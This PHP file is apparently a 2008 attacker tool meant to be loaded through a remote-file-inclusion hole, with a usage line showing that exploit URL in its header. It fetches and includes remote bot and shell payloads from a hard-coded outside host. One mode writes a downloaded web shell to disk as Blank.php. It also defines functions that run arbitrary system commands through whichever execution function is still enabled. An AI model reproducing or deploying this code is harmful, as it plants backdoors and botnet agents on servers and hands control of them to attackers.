<?php
##########################################
## McN Executed 	##
## (c) Apr-2008 ##
##########################################
## [+] http://target/bug.php?path=http://yoursite/cmd.txt?&cmd=[?]
##########################################
## [+] PBOT
## [+] SHELL
## [+] OTHER
## [+] PSY
## [+] IPSBOT
##########################################
?>
<html>
<style>
  body { font:10pt tahoma;color:lime;background:black;margin:4; }
  a    { color:red;text-decoration:none; }
</style>
<body>
<?php
$cmd = $_GET["cmd"];

###[ SRC SITE ]###
$situz = 'http://alladin-shop.ru/configure/';
###[ SRC SHF ]###
$sh_src = $situz.'LICENSE.TXT';
###[ NAMA PSH ]###
$sh_file = 'Blank.php';
###[ FILE SHF ]###

###[ SRC A ]###
$a_src = $situz.'IPS?';
###[ SRC A ]###

###[ SRC B ]###
$b_src = $situz.'PB?';
###[ SRC B ]###

###[ SRC C ]###
$c_src = $situz.'SP?';
###[ SRC C ]###

###[ SRC D ]###
$d_src = $situz.'PSY?';
###[ SRC D ]###


##[ EXECUTE ]##
switch ($cmd) {
  case "IPS":
    include($a_src);
    break;
  case "PB":
    include($b_src);
    break;
  case "SP":
    include($c_src);
    break;
  case "PSY":
    include($d_src);
    break;
  case "SHF":
    $cdir = @getcwd();
    $html = implode('', @file($sh_src));
    $f    = ($cdir.DIRECTORY_SEPARATOR.$sh_file);
    $r    = @fopen($f,'w');
    if (@fwrite($r,$html)) { echo "Writed to $f!"; }
    else { die("Error writing $f!"); }
    fclose($r);
    break;
  default:
    echo "<b><font color=\"orange\">ERROR:</font> </b><font color=\"gray\">MoDe SaLaH!!</font>";
    break;
}

###########################
###[ CHECK WRITABLE ]###
###########################
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function cuex($cmd) {
  $rez = "";
  if (enabled("popen")) { if ( is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { @$rez .= fread($h, 2096);  } pclose($h); } }
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("system")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  return $rez;
}
function tulis_file($nf,$txt) {
  if (!$handle = fopen($nf, 'a')) { echo "Error opening $namafile!"; return; }
  if (fwrite($handle, $txt) === FALSE) { echo "Error writing $nf!"; return; }
  else { echo "Saved! $txt"; fclose($handle); }
}
?>

</body></html>
<?php die(); ?>
